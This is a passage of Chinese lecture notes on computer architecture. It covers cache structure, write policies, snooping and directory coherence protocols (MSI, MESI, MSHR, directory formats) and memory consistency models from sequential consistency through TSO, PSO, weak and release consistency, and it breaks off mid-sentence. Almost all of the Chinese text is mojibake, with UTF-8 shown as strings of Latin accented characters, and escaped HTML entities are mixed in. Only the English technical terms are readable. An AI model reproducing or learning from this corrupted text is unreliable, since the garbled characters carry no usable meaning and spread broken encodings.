CPI + Structural stalls + Data hazard stalls + Control stalls\nILPçš„æé™\näºŒã€é«˜é€Ÿç¼“å­˜ç»“æ„ 1ã€å­˜å‚¨å±‚æ¬¡ç»“æ„\n2ã€cacheåŸºæœ¬ç»“æ„\n3ã€å­˜å‚¨ç³»ç»Ÿçš„ç»“æ„æ¨¡å‹\nå…±äº«å­˜å‚¨ç³»ç»Ÿï¼ˆå¤šæ ¸å¤„ç†å™¨ï¼‰ é›†ä¸­å¼å…±äº«å­˜å‚¨ç»“æ„ï¼ˆSMPï¼Œä¹Ÿè¢«ç§°ä¸ºUMAï¼Œuniform memory accessï¼‰ åˆ†å¸ƒå¼å…±äº«å­˜å‚¨ç»“æ„ï¼ˆDSMï¼Œä¹Ÿè¢«ç§°ä¸ºNUMAï¼Œnon-uniform memory accessï¼‰å¤šæ•°æƒ…å†µä¸‹è¦ä¼˜äºé›†ä¸­å¼å…±äº«å­˜å‚¨ç»“æ„ éå…±äº«å¼å­˜å‚¨ç³»ç»Ÿï¼ˆåˆ†å¸ƒå¼è®¡ç®—æœºï¼‰ 2.4 Cacheä¸€è‡´æ€§é—®é¢˜ï¼ˆä¸ä¸€è‡´äº§ç”Ÿçš„åŸå› ï¼‰ I/Oæ“ä½œ\nCacheä¸­çš„å†…å®¹å¯èƒ½ä¸ç”±I/Oå­ç³»ç»Ÿè¾“å…¥è¾“å‡ºå½¢æˆçš„å­˜å‚¨å™¨å¯¹åº”éƒ¨åˆ†çš„å†…å®¹ä¸åŒ å…±äº«æ•°æ®\nä¸åŒå¤„ç†å™¨çš„Cacheéƒ½ä¿å­˜æœ‰å¯¹åº”å­˜å‚¨å•å…ƒçš„å†…å®¹ å¦‚ä½•ä¿æŒåŒä¸€æ•°æ®å•å…ƒåœ¨CacheåŠä¸»å­˜ä¸­çš„å¤šä¸ªå¤‡ä»½çš„ä¸€è‡´æ€§ï¼Œé¿å…è·å–é™ˆæ—§æ•°æ® Cacheçš„å†™æœºåˆ¶\nWrite-backï¼šå†™å›æ¨¡å¼ï¼šæ•°æ®è¢«æ¢å‡ºcacheæ—¶ï¼Œè¢«ä¿®æ”¹çš„æ•°æ®æ‰æ›´æ–°åˆ°å†…å­˜ Write-throughï¼šå†™ç›´è¾¾æ¨¡å¼ï¼šCPUå‘cacheå†™å…¥æ•°æ®æ—¶ï¼ŒåŒæ—¶å‘memoryå†™ Write-missï¼šå†™å¤±æ•ˆï¼šæ‰€è¦å†™çš„åœ°å€ä¸åœ¨cacheä¸­æ—¶ no write allocate policy:å°†è¦å†™çš„å†…å®¹ç›´æ¥å†™å›memory; write allocate policy:å°†è¦å†™çš„åœ°å€æ‰€åœ¨çš„å—å…ˆä»memoryè°ƒå…¥cacheä¸­ï¼Œç„¶åå†™cacheï¼› 2.5 cacheä¸€è‡´æ€§åè®® å…³é”®ï¼šè·Ÿè¸ªå…±äº«æ•°æ®å—çš„çŠ¶æ€\nè·Ÿè¸ªå…±äº«æ•°æ®å—çŠ¶æ€çš„cacheåè®®æœ‰ä¸¤ç§ï¼š\nï¼ˆ1ï¼‰Snooping-based protocolsï¼ˆåŸºäºç›‘å¬çš„åè®®ï¼‰ï¼šæ¯ä¸ªCacheé™¤äº†åŒ…å«ç‰©ç†å­˜å‚¨å™¨\nä¸­å—çš„æ•°æ®æ‹·è´ä¹‹å¤–ï¼Œä¹Ÿä¿å­˜ç€å„ä¸ªå—çš„å…±äº«çŠ¶æ€ä¿¡æ¯ã€‚\nå®ç°ç›‘å¬ä¸€è‡´æ€§åè®®çš„ä¸¤ç§ç­–ç•¥ï¼šWrite Updateå’ŒWrite Invalidate\nWrite Invalidateï¼ˆå†™ä½œåºŸç­–ç•¥ï¼‰ï¼šåœ¨ä¸€ä¸ªå¤„ç†å™¨å†™æŸä¸ªæ•°æ®é¡¹ä¹‹å‰ä¿è¯å®ƒå¯¹è¯¥æ•°æ®é¡¹æœ‰å”¯ä¸€çš„è®¿é—®æƒï¼Œå°†å…±äº«å•å…ƒçš„å…¶å®ƒå¤‡ä»½ä½œåºŸã€‚\nWrite Updateï¼ˆå†™æ›´æ–°ç­–ç•¥ï¼‰ï¼šå½“ä¸€ä¸ªå¤„ç†å™¨æ›´æ–°æŸå…±äº«å•å…ƒæ—¶ï¼ŒæŠŠæ›´æ–°çš„å†…å®¹ä¼ æ’­ç»™æ‰€æœ‰æ‹¥æœ‰è¯¥å…±äº«å•å…ƒå¤‡ä»½çš„å¤„ç†å™¨ã€‚\nåè®®æ ¸å¿ƒï¼šé€šè¿‡å¹¿æ’­ç»´æŠ¤ä¸€è‡´æ€§\nå†™å…¥æ•°æ®çš„å¤„ç†å™¨æŠŠæ–°å†™çš„å€¼æˆ–æ‰€éœ€çš„å­˜å‚¨è¡Œåœ°å€é€šè¿‡æ€»çº¿å¹¿æ’­å‡ºå»\nå…¶ä»–å¤„ç†å™¨ç›‘å¬å¹¿æ’­ï¼Œå½“å¹¿æ’­ä¸­çš„å†…å®¹ä¸è‡ªå·±æœ‰å…³æ—¶ï¼Œæ¥å—æ–°å€¼æˆ–æä¾›æ•°æ®\né€‚åˆå¤šä¸ªå¤„ç†å™¨é€šè¿‡æ€»çº¿ç›¸è¿çš„é›†ä¸­å¼å…±äº«å­˜å‚¨ç³»ç»Ÿ\nå±€é™æ€§\nå…±äº«æ€»çº¿å­˜åœ¨ç«äº‰ä½¿ç”¨é—®é¢˜ åœ¨ç”±å¤§é‡å¤„ç†å™¨æ„æˆçš„å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œç›‘å¬å¸¦å®½ä¼šæˆä¸ºç“¶é¢ˆ æ€»çº¿ä¸Šèƒ½å¤Ÿè¿æ¥çš„å¤„ç†å™¨æ•°ç›®æœ‰é™ï¼Œéš¾æ‰©å±•åˆ°å¤„ç†å™¨è§„æ¨¡è¾ƒå¤§çš„ç³»ç»Ÿ åªé€‚ç”¨äºå¯ä¼¸ç¼©æ€§å·®çš„å…±äº«æ€»çº¿ç»“æ„ åŸºäºç›‘å¬åè®®ã€å†™ä½œåºŸã€å†™æ›´æ–°ç­–ç•¥çš„å®ç°æŠ€æœ¯\næ€»çº¿æ˜¯å¹¿æ’­çš„åª’ä»‹\nCacheæ§åˆ¶å™¨ç›‘å¬ï¼ˆsnoopï¼‰å…±äº«æ€»çº¿ä¸Šçš„æ‰€æœ‰äº‹åŠ¡\n1ã€Valid/Invalidåè®®\nå­˜åœ¨çš„é—®é¢˜\næ¯æ¬¡å†™å…¥éƒ½ä¼šæ›´æ–°ä¸»å­˜\næ¯æ¬¡å†™å…¥éƒ½éœ€è¦å¹¿æ’­å’Œç›‘å¬å…±äº«æ•°æ®å—çŠ¶æ€\n2ã€MSIåè®®\nç‰¹ç‚¹ï¼š\nå…è®¸cacheåœ¨ä¸æ›´æ–°å†…å­˜çš„æƒ…å†µä¸‹ä¸ºå†™æ“ä½œæä¾›æœåŠ¡ ä¸»å­˜ä¸­å¯èƒ½æœ‰é™ˆæ—§çš„æ•°æ® Cacheå¿…é¡»è¦†ç›–æ¥è‡ªä¸»å­˜çš„å“åº” é—®é¢˜ï¼š\nå¯¹ç§æœ‰æ•°æ®æ‰§è¡Œè¯»-ä¿®æ”¹-å†™çš„åºåˆ—æ“ä½œ 3ã€MESIåè®®\nå¼•å…¥EçŠ¶æ€ï¼šç‹¬å ï¼Œæ²¡æœ‰å…¶ä»–å¤„ç†å™¨ç¼“å­˜äº†è¯¥æ•°æ®å¤‡ä»½ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ï¼Œä¸å¿…é©¬ä¸ŠåŒ\næ­¥åˆ°ä¸»å­˜ä¸­\nä¸€è‡´æ€§åè®®æ‰€é¢ä¸´çš„é—®é¢˜ï¼šå‡å…±äº«é—®é¢˜ï¼Œå‚è€ƒï¼šå­—èŠ‚é¢ï¼šä»€ä¹ˆæ˜¯ä¼ªå…±äº«ï¼Ÿ (qq.com)\nCacheä¸€è‡´æ€§æ˜¯åœ¨å—çº§åˆ«å®ç° ä¸€ä¸ªCacheå—ä¸­åŒ…å«å¤šä¸ªæ•°æ®å­— å¤šä¸ªå¤„ç†å™¨å¹¶å‘è®¿é—®åŒä¸€æ•°æ®å—çš„ä¸åŒæ•°æ®å­—æ—¶ å‡è®¾å¤„ç†å™¨P1å†™å­—iï¼Œå¤„ç†å™¨P2å†™å­—kï¼Œä¸”ä¸¤ä¸ªå­—æœ‰ç›¸åŒçš„å—åœ°å€ ç”±äºåœ°å€åœ¨åŒä¸€å—ä¸­ï¼Œè¯¥å—å¯èƒ½ä¼šäº§ç”Ÿå¤šæ¬¡ä¸å¿…è¦çš„å¤±æ•ˆï¼ˆ ping-pongé—®é¢˜ï¼‰ è§£å†³æ–¹æ¡ˆï¼šåŸå­æ“ä½œ\nä»£ä»·é«˜ã€è€—è´¹å¤§ï¼Œä¸¥é‡å½±å“å¹¶è¡Œè®¡ç®—çš„æ€§èƒ½ ï¼ˆ2ï¼‰Directory-based protocolsï¼ˆåŸºäºç›®å½•çš„åè®®ï¼‰ï¼šç‰©ç†å­˜å‚¨å™¨ä¸­å…±äº«æ•°æ®å—çš„çŠ¶æ€åŠç›¸å…³ä¿¡æ¯å‡è¢«ä¿å­˜åœ¨ä¸€ä¸ªç§°ä¸ºç›®å½•çš„åœ°æ–¹ã€‚\nä¸ºæ¯ä¸€å­˜å‚¨å—ç»´æŒä¸€ç›®å½•é¡¹ï¼Œè®°å½•æ‰€æœ‰å½“å‰æŒæœ‰æ­¤å­˜å‚¨è¡Œå¤‡ä»½çš„å¤„ç†å™¨IDä»¥åŠæ­¤è¡Œæ˜¯å¦å·²ç»è¢«æ”¹å†™ç­‰ä¿¡æ¯\nå½“æŸä¸ªå¤„ç†å™¨æ”¹å†™æŸè¡Œæ—¶ï¼Œæ ¹æ®ç›®å½•å†…å®¹åªå‘æŒæœ‰æ­¤è¡Œå¤‡ä»½çš„å¤„ç†å™¨å‘é€ä¿¡å·ï¼Œé¿å…äº†å¹¿æ’­ã€‚\né€‚ç”¨äºåˆ†å¸ƒå¼å…±äº«å­˜å‚¨ç³»ç»Ÿ\n1ã€MSIç›®å½•åè®®\n2ã€ ç¼ºå¤±çŠ¶æ€ä¿æŒå¯„å­˜å™¨ï¼ˆMSHRï¼‰\nMSHRï¼šç”¨äºå­˜å‚¨ç¼“å­˜æœªå‘½ä¸­ï¼ˆcache missï¼‰çš„çŠ¶æ€ä¿¡æ¯\nå‘èµ·å¯¹å†…å­˜çš„è®¿é—®ä»¥è·å–ç¼ºå¤±çš„æ•°æ®ï¼Œå¹¶åœ¨æ•°æ®è¿”å›åå°†å…¶å­˜å‚¨åˆ°ç¼“å­˜ä¸­ MSHRï¼šåœ¨Cacheå¤–ä¿æŒåŠ è½½å¤±è´¥ï¼ˆload missesï¼‰å’Œå†™å…¥\næ¯ä¸ªMSHR entryå¯¹åº”ä¸€ä¸ªç¼“å­˜æœªå‘½ä¸­äº‹ä»¶ï¼Œå¹¶åŒ…å«ä¸è¯¥äº‹ä»¶ç›¸å…³çš„çŠ¶æ€\nå’Œå…ƒæ•°æ®\nOn eviction / writeback\næ²¡æœ‰ç©ºé—²çš„MSHR entryï¼šstall åˆ†é…æ–°çš„MSHR entry 3ã€ç›®å½•ç»“æ„\nåŸºäºå†…å­˜çš„æ‰å¹³ç›®å½•ç»“æ„ï¼ˆFlatï¼‰\nä½¿ç”¨ä¸»å­˜çš„å°‘é‡ç©ºé—´æ¥å­˜å‚¨æ¯ä¸€ä¸ªCacheLineçš„çŠ¶æ€å’Œå…±äº«è€… ä½¿ç”¨ä½å‘é‡æ¥ç¼–ç å…±äº«è€… å®ç°ç®€å•ï¼Œé€Ÿåº¦æ…¢ï¼Œå¤„ç†å™¨æ•°é‡å¤šçš„æƒ…å†µä¸‹æ•ˆç‡éå¸¸ä½ï¼ˆ~P bits/lineï¼‰\nç¨€ç–å…¨æ˜ å°„(Full-Map)ç›®å½•\næˆ‘ä»¬ä¸éœ€è¦è®°å½•ç³»ç»Ÿä¸­çš„æ¯ä¸€ä¸ªCache lineâ€”â€”åªéœ€è¦è®°å½•ç§æœ‰ç¼“å­˜çš„ä½ç½® å°†ç›®å½•ç»„ç»‡æˆä¸€ä¸ªCache ä½å»¶è¿Ÿï¼Œèƒ½æ•ˆæ›´é«˜ï¼Œæ‰©å±•æ€§é—®é¢˜\u0026ndash;\u0026gt;ä½å‘é‡å¢é•¿çš„é€Ÿåº¦éšç€å¤„ç†å™¨æ ¸å¿ƒçš„æ•°é‡å¢é•¿ï¼Œæœ‰é™å…³è”åº¦\u0026ndash;\u0026gt; ç›®å½•å¼•å‘çš„å¤±æ•ˆ\nä¼˜åŒ–æŠ€æœ¯ï¼šå…±äº«è€…é›†åˆçš„ä¸ç²¾ç¡®è¡¨ç¤º\nç²—ç²’åº¦ä½å‘é‡ï¼ˆå¦‚ï¼Œæ¯ 4 ä¸ªå¤„ç†å™¨æ ¸å¿ƒä½¿ç”¨1 bitè¡¨ç¤ºï¼‰\næœ‰é™æŒ‡é’ˆï¼šä¿ç•™æœ‰é™çš„å…±äº«è€…æŒ‡é’ˆï¼Œåœ¨æº¢å‡ºæ—¶æ ‡è®°â€œall\u0026quot;å¹¶è¿›è¡Œå¹¿æ’­ï¼ˆæˆ–ä½¿å…¶ä»–å…±äº«è€…æ— æ•ˆï¼‰\nå¤šçº§å±‚æ¬¡ç»“æ„ä¸­çš„ä¸€è‡´æ€§ï¼šå¯ä»¥ä½¿ç”¨ç›¸åŒæˆ–ä¸åŒçš„åè®®æ¥ä¿æŒè·¨å¤šä¸ªå±‚æ¬¡çš„ä¸€è‡´æ€§\nIn-Cacheç›®å½•\né€šç”¨çš„å¤šæ ¸å†…å­˜å±‚æ¬¡ç»“æ„ï¼š 1+ level çš„Private Cache å…±äº«çš„last-level Cache éœ€è¦åŠ å¼ºPrivate Cacheä¹‹é—´çš„ä¸€è‡´æ€§ æ–¹æ³•ï¼šå°†ç›®å½•ä¿¡æ¯åµŒå…¥åœ¨å…±äº«çš„cache tagsä¸­ å…±äº«Cacheå¿…é¡»inclusive é¿å…äº†tagå¼€é”€å’Œå•ç‹¬çš„æŸ¥æ‰¾ï¼Œå¦‚æœå…±äº«Cacheçš„å¤§å° \u0026raquo; sum(ç§æœ‰Cacheçš„å¤§å°)ï¼Œæ•ˆç‡å¯èƒ½ä¼šéå¸¸ä½ ä¸€è‡´æ€§åè®®é¢ä¸´çš„é—®é¢˜\nå³ä½¿ç½‘ç»œæ˜¯æ— æ­»é”çš„ï¼Œåè®®ä¹Ÿä¼šå¯¼è‡´æ­»é”ï¼\næ¯”å¦‚ï¼Œä¸¤ä¸ªèŠ‚ç‚¹éƒ½é€šè¿‡ç›¸äº’è¯·æ±‚è®©æ‰€æœ‰çš„ä¸­é—´ç¼“å†²åŒºé¥±å’Œï¼Œé˜»å¡å“åº”è¿›å…¥ç½‘ç»œã€‚\nè§£å†³æ–¹æ¡ˆï¼šç‹¬ç«‹çš„è™šæ‹Ÿç½‘ç»œ\nä¸åŒçš„è™šæ‹Ÿé€šé“é›†åˆå’Œendpointç¼“å†²é›†åˆ ç›¸åŒçš„ç‰©ç†è·¯ç”±å™¨å’Œé“¾æ¥ ä¸‰ã€å†…å­˜ä¸€è‡´æ€§æ¨¡å‹ å†…å­˜ä¸€è‡´æ€§æ¨¡å‹æ˜¯é¢å‘å¤šæ ¸å¤„ç†å™¨çš„å…±äº«å­˜å‚¨ç³»ç»Ÿ\nç³»ç»Ÿè®¾è®¡è€…ä¸åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸€ç§çº¦å®š, å®ƒç»™å‡ºäº†æ­£ç¡®ç¼–å†™ç¨‹åºçš„æ ‡å‡†, ä½¿å¾—ç¨‹åºå‘˜æ— é¡»è€ƒè™‘å…·ä½“è®¿å­˜æ¬¡åºå°±èƒ½ç¼–å†™æ­£ç¡®ç¨‹åº, è€Œç³»ç»Ÿè®¾è®¡è€…åˆ™å¯ä»¥æ ¹æ®è¿™ä¸ªçº¦å®šæ¥ä¼˜åŒ–è®¾è®¡æé«˜æ€§èƒ½ã€‚\nç³»ç»Ÿè®¾è®¡è€…é€šè¿‡å¯¹å„å¤„ç†å™¨çš„è®¿å­˜æ“ä½œå®Œæˆæ¬¡åºåŠ ä»¥å¿…è¦çš„çº¦æŸæ¥æ»¡è¶³å†…å­˜ä¸€è‡´æ€§æ¨¡å‹çš„è¦æ±‚\nå†…å­˜ä¸€è‡´æ€§æ¨¡å‹å¯¹è®¿å­˜äº‹ä»¶æ¬¡åºæ–½åŠ çš„é™åˆ¶è¶Šå¼±, è¶Šæœ‰åˆ©äºæé«˜æ€§èƒ½, ä½†ç¼–ç¨‹è¶Šéš¾ Coherence vs Consistency\nç¼“å­˜ä¸€è‡´æ€§ï¼ˆCache Coherenceï¼‰ ç¼“å­˜ä¸€è‡´æ€§å…³æ³¨å…±äº«å­˜å‚¨ç³»ç»Ÿä¸­å¤šä¸ªå¤„ç†å™¨å¯¹åŒä¸€å†…å­˜ä½ç½®è¿›è¡Œè¯»å†™çš„æƒ…å†µ è½¯ä»¶æ— éœ€æ˜¾å¼åœ°ç®¡ç†ç§æœ‰ç¼“å­˜ï¼Œè¿™ä¸€åˆ‡éƒ½ç”±ç¡¬ä»¶æ¥å¤„ç† å†…å­˜ä¸€è‡´æ€§ï¼ˆMemory consistencyï¼‰ å®šä¹‰ï¼šå†…å­˜ä¸€è‡´æ€§æ¨¡å‹å®šä¹‰äº†å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­çš„å†…å­˜è®¿é—®è§„åˆ™ï¼Œä»¥ç¡®ä¿å¤šä¸ªå¤„ç†å™¨åœ¨è¯»å†™å…±äº«å†…å­˜æ—¶èƒ½å¤Ÿè·å¾—ä¸€è‡´çš„ç»“æœ å†…å­˜ä¸€è‡´æ€§æ¨¡å‹æ¶‰åŠåˆ°å¯¹å¤šä¸ªå†…å­˜ä½ç½®çš„è¯»å†™æ“ä½œ å†…å­˜ä¸€è‡´æ€§æ¨¡å‹åˆ†ç±» ï¼ˆ1ï¼‰ æ”¾æ¾W-\u0026gt;Ré¡ºåºï¼šæˆ‘ä»¬å°±å¾—åˆ°äº†TSO(total store ordering)æ¨¡å‹ï¼Œå®ƒå…è®¸CPUå…ˆæ‰§è¡Œè¯»æ“ä½œç„¶ååœ¨æ‰§è¡Œå†™æ“ä½œè€Œä¸ä¸¥æ ¼æŒ‰ç…§ä»£ç çš„æŒ‡ç¤ºé¡ºåºæ¥è¿›è¡Œã€‚ç”±äºè¿™ç§æ¨¡å‹ä¿æŒäº†å†™å…¥æ“ä½œä¹‹é—´çš„é¡ºåºï¼Œæ‰€ä»¥å¾ˆå¤šåœ¨Sequentialæ¨¡å‹ä¸‹èƒ½å¤Ÿè¿è¡Œçš„ä»£ç ä¹Ÿèƒ½åœ¨TSOæ¨¡å‹ä¸‹æ­£å¸¸è¿è¡Œã€‚\nï¼ˆ2ï¼‰ æ”¾æ¾W-\u0026gt;Wé¡ºåºï¼šæˆ‘ä»¬å°±å¾—åˆ°äº†PSO(partial store ordering)æ¨¡å‹ï¼Œå…è®¸å¤šä¸ªå†™æ“ä½œä¹Ÿè¢«æ‰“ä¹±é¡ºåºã€‚\nï¼ˆ3ï¼‰ æ”¾æ¾R-\u0026gt;Wå’ŒR-\u0026gt;Ré¡ºåºï¼šå°†ä¼šå¾—åˆ°å¾ˆå¤šæ¨¡å‹ï¼ŒåŒ…æ‹¬weakæ¨¡å‹ï¼Œreleasedæ¨¡å‹ç­‰ã€‚\né¡ºåºä¸€è‡´æ€§æ¨¡å‹ï¼ˆSequential Consistencyï¼‰\nè¯¥æ¨¡å‹è¦æ±‚æ‰€æœ‰å¤„ç†å™¨çš„è¯»ã€å†™å’Œäº¤æ¢(swap)æ“ä½œä»¥æŸç§åºæ‰§è¡Œæ‰€å½¢æˆçš„å…¨å±€å­˜å‚¨å™¨æ¬¡åºã€ç¬¦åˆå„å¤„ç†å™¨çš„åŸæœ‰ç¨‹åºæ¬¡åºã€‚å³â€œæ— è®ºæŒ‡ä»¤æµå¦‚ä½•äº¤å æ‰§è¡Œï¼Œå…¨å±€åºå¿…é¡»ä¿æŒæ‰€æœ‰è¿›ç¨‹çš„ç¨‹åº æ‰€æœ‰è¯»å†™ä»¥æŸç§é¡ºåºæ‰§è¡Œï¼Œæ¯ä¸ªå¤„ç†å™¨çœ‹åˆ°çš„æ“ä½œé¡ºåºæ˜¯ç›¸åŒçš„ é¡ºåºæ‰§è¡ŒæŒ‡ä»¤ å¯¹äºå­˜å‚¨å™¨çš„è®¿é—®æ˜¯æ˜¯åŸå­çº§çš„loads å’Œstores å®¹æ˜“ç†è§£ï¼Œä½†æ¶æ„å¸ˆå’Œç¼–è¯‘å™¨ç¼–å†™äººå‘˜å¸Œæœ›åœ¨æ€§èƒ½æ–¹é¢æœ‰æ‰€æå‡ï¼Œæ„å‘³ç€éœ€è¦è¿èƒŒé¡ºåºä¸€è‡´æ€§æ¨¡å‹çš„è¦æ±‚ ä¼˜åŒ–æŠ€æœ¯æäº¤å­˜å‚¨ç¼“å†²åŒºï¼ˆCommitted store bufferï¼‰ å½“å·²æäº¤çš„storeæŒ‡ä»¤åœ¨å†…å­˜ç³»ç»Ÿé‡Œæ‰§è¡Œä¼ æ’­æ—¶ï¼ŒCPUå¯ä»¥ç»§ç»­æ‰§è¡Œ Local loads can bypass values from buffered stores to the same address å®Œå…¨å­˜å‚¨å®šåºæ¨¡å‹ï¼ˆTotal Store Orderï¼‰\nå…¨å±€é¡ºåºå­˜å‚¨ï¼šstoreæ“ä½œå­˜åœ¨ä¸€ä¸ªå…¨å±€çš„é¡ºåº Storeç¼“å†²ï¼šå…è®¸å¤„ç†å™¨ä½¿ç”¨Store bufferæ¥ç¼“å­˜å³å°†å†™å…¥å†…å­˜çš„æ•°æ®ï¼Œä½†å¿…é¡»ç¡®ä¿ç¼“å†²ä¸­çš„æ•°æ®åœ¨å…¨å±€ä¸Šæœ‰åºæäº¤ loadåŒæ ·æŒ‰é¡ºåºæ‰§è¡Œï¼Œä½†å¯ç©¿æ’åˆ°å¤šä¸ªstoreæ‰§è¡Œè¿‡ç¨‹ä¸­ è‹¥å­˜åœ¨ä¸€ç»„store-\u0026gt;loadæ“ä½œï¼Œå¦‚æœç”±åŒä¸€å¤„ç†å™¨æ‰§è¡Œä¸”åœ°å€ç›¸å…³ï¼Œåˆ™TSOå…è®¸è¯¥loadæ“ä½œåœ¨storeæ“ä½œå®Œæˆä¹‹å‰å°±æ‰§è¡Œï¼›ä½†å¦‚æœç”±å¤šä¸ªcoreæ‰§è¡Œä¸”åœ°å€ç›¸å…³ï¼Œé‚£TSOè¦æ±‚loadæŒ‡ä»¤åœ¨storeæ‰§è¡Œå®Œæˆåæ‰èƒ½æ‰§è¡Œ éƒ¨åˆ†å­˜å‚¨å®šåºæ¨¡å‹ï¼ˆPartial Store Orderï¼‰\nåœ¨TSOçš„åŸºç¡€ä¸Šæ”¾æ¾è®¿é—®å†…å­˜è®¿é—®é™åˆ¶ï¼Œå…è®¸CPUä»¥éFIFOæ¥å¤„ç†store bufferç¼“å†²åŒºçš„æŒ‡ä»¤; å±€éƒ¨å­˜å‚¨é¡ºåºæ¾æ•£ï¼šstoreæ“ä½œçš„é¡ºåºå¯ä»¥åœ¨å…¨å±€èŒƒå›´å†…æ›´åŠ çµæ´»åœ°é‡æ’åºï¼Œè¿™å…è®¸æ›´å¤§çš„å¹¶å‘æ€§ï¼› CPUåªä¿è¯åœ°å€ç›¸å…³æŒ‡ä»¤åœ¨store bufferä¸­ä»¥FIFOçš„å½¢å¼è¿›è¡Œå¤„ç†ï¼Œè€Œå…¶ä»–çš„åˆ™å¯ä»¥ä¹±åºå¤„ç†; è¦æ±‚ åŒä¸€coreä¸­åœ°å€ä¸ç›¸å…³çš„store-\u0026gt;storeæŒ‡ä»¤å¯ä»¥äº’ç›¸ç©¿æ’æ‰§è¡Œ loadæŒ‰é¡ºåºæ‰§è¡Œï¼Œä½†å¯ç©¿æ’åˆ°å¤šä¸ªstoreæ‰§è¡Œè¿‡ç¨‹ä¸­ å¼±å†…å­˜ä¸€è‡´æ€§æ¨¡å‹ï¼ˆWeak Memory Consistencyï¼‰\nåŸºæœ¬æ€æƒ³ï¼šåŒæ­¥æ“ä½œï¼ˆsynchronization ï¼‰å’Œæ™®é€šè®¿å­˜æ“ä½œåŒºåˆ†å¼€æ¥ é€šè¿‡æ˜¾å¼çš„åŒæ­¥æ“ä½œæ¥ç¡®ä¿å¯¹å…±äº«æ•°æ®çš„ä¸€è‡´æ€§ï¼Œè€Œä¸æ˜¯ä¾èµ–äºéšå¼çš„è§„åˆ™å’Œé¡ºåº åŒæ­¥æ“ä½œï¼š ç¨‹åºå‘˜ä½¿ç”¨ç‰¹å®šçš„åŒæ­¥æ“ä½œï¼ˆä¾‹å¦‚é”ã€å±éšœç­‰ï¼‰æ¥æ˜ç¡®æŒ‡å®šä¸´ç•ŒåŒºåŸŸï¼Œç¡®ä¿åœ¨è¯¥åŒºåŸŸå†…çš„å¯¹å…±äº«æ•°æ®çš„è®¿é—®æ˜¯äº’æ–¥çš„ã€‚è¿™æ ·å¯ä»¥é¿å…å¹¶å‘å†™å…¥å¼•èµ·çš„é—®é¢˜ æ™®é€šè®¿å­˜æ“ä½œï¼š å¯¹äºéä¸´ç•ŒåŒºåŸŸçš„è®¿é—®ï¼Œç¨‹åºå‘˜ä¸ä¾èµ–äºéšå¼çš„è§„åˆ™ï¼Œè€Œæ˜¯é€šè¿‡æ˜¾å¼åŒæ­¥æ¥ç¡®ä¿ä¸€è‡´æ€§ã€‚æ™®é€šè®¿å­˜æ“ä½œå¯ä»¥æŒ‰ç…§æ›´çµæ´»çš„é¡ºåºè¿›è¡Œï¼Œä»¥æé«˜æ€§èƒ½ã€‚ å¼±å†…å­˜ä¸€è‡´æ€§æ¨¡å‹æ–½åŠ çš„é™åˆ¶: åŒæ­¥æ“ä½œçš„æ‰§è¡Œæ»¡è¶³é¡ºåºä¸€è‡´æ€§æ¡ä»¶; åœ¨ä»»æ„æ™®é€šè®¿å­˜æ“ä½œè¢«å…è®¸æ‰§è¡Œä¹‹å‰, æ‰€æœ‰åœ¨åŒä¸€å¤„ç†å™¨ä¸­å…ˆäºè¿™ä¸€è®¿å­˜æ“ä½œçš„åŒæ­¥æ“ä½œéƒ½å·²å®Œæˆ åœ¨ä»»ä¸€åŒæ­¥æ“ä½œè¢«å…è®¸æ‰§è¡Œä¹‹å‰,æ‰€æœ‰åœ¨åŒä¸€å¤„ç†å™¨ä¸­å…ˆäºè¿™ä¸€åŒæ­¥æ“ä½œçš„æ™®é€šè®¿å­˜æ“ä½œéƒ½å·²å®Œæˆ é‡Šæ”¾ä¸€è‡´æ€§æ¨¡å‹ï¼ˆ Release Consistency ï¼‰\nå¯¹äºä¸´ç•ŒåŒºåŸŸå…±äº«æ•°æ®çš„è®¿é—®ï¼Œå¼±å†…å­˜ä¸€è‡´æ€§æ¨¡å‹æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå°±æ˜¯æ— æ³•åŒºåˆ†è¿›ç¨‹æ˜¯å‡†å¤‡è¿›å…¥ä¸´ç•ŒåŒºè¿˜æ˜¯å·²ç»å®Œæˆå¯¹å…±äº«å˜é‡çš„æ“ä½œè€Œå‡†å¤‡é€€å‡ºä¸´ç•ŒåŒºï¼Œå…¶åæœå°±æ˜¯è¿›ç¨‹åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹éƒ½å¿…é¡»é‡‡å–åŒæ­¥æ“ä½œï¼š\nè¿›å…¥ä¸´ç•ŒåŒºï¼šå¦‚æœä¸€ä¸ªè¿›ç¨‹å‡†å¤‡è¿›å…¥ä¸´ç•ŒåŒºï¼Œå…¶ä»–è¿›ç¨‹æ— æ³•ç¡®åˆ‡çŸ¥é“å®ƒæ˜¯å¦å·²ç»å®Œæˆå¯¹å…±äº«å˜é‡çš„å†™å…¥ã€‚å› æ­¤å…¶ä»–è¿›ç¨‹å¯èƒ½éœ€è¦é‡‡å–åŒæ­¥æ“ä½œä»¥ç¡®ä¿å®ƒä»¬ä¸ä¼šè¯»å–åˆ°ä¸å®Œæ•´æˆ–æ— æ•ˆçš„æ•°æ®â€“ é€€å‡ºä¸´ç•ŒåŒºï¼šå½“ä¸€ä¸ªè¿›ç¨‹å‡†å¤‡é€€å‡ºä¸´ç•ŒåŒºæ—¶ï¼Œå…¶ä»–è¿›ç¨‹æ— æ³•ç¡®åˆ‡çŸ¥é“è¯¥è¿›ç¨‹æ˜¯å¦å·²ç»å®Œæˆå¯¹å…±äº«å˜é‡çš„æ“ä½œã€‚å› æ­¤ï¼Œå…¶ä»–è¿›ç¨‹å¯èƒ½éœ€è¦é‡‡å–åŒæ­¥æ“ä½œä»¥ç¡®ä¿å®ƒä»¬ä¸ä¼šåœ¨ä¸å®Œæ•´æˆ–æ— æ•ˆçš„æ•°æ®ä¸Šæ‰§è¡Œæ“ä½œ\nå¦‚æœèƒ½å°†è¿›å…¥å’Œé€€å‡ºä¸´ç•ŒåŒºè¿™ä¸¤ä¸ªåŠ¨ä½œåŒºåˆ†å¼€æ¥ï¼Œåˆ™èƒ½å®ç°ä¸€ç§æ›´ä¸ºé«˜æ•ˆçš„å­˜å‚¨ä¸€è‡´æ€§æ¨¡å‹â”€é‡Šæ”¾ä¸€è‡´æ€§æ¨¡å‹\nè¿™ç§æ¨¡å‹æ˜¯å¯¹å¼±ä¸€è‡´æ€§æ¨¡å‹çš„æ”¹è¿›, å®ƒæŠŠåŒæ­¥æ“ä½œè¿›ä¸€æ­¥åˆ†æˆè·å–æ“ä½œ acquire 